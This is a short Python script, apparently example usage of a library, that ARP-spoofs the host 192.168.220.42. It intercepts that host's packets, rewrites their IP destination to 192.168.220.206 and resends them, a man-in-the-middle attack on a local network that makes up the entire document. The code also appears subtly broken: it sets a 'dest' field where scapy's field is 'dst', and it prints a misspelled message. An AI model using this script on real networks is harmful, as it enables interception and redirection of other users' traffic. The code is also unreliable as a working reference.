from nifty.network.arp.spoof import ARPSpoofer
from scapy.packet import Packet
from scapy.all import IP, sendpfast


def on_packet(pckt: Packet):
    if pckt.haslayer(IP):
        print("Editing destinationn")
        pckt[IP].dest = "192.168.220.206"
    sendpfast(pckt)

spoof = ARPSpoofer("192.168.220.42")
spoof.run(on_packet)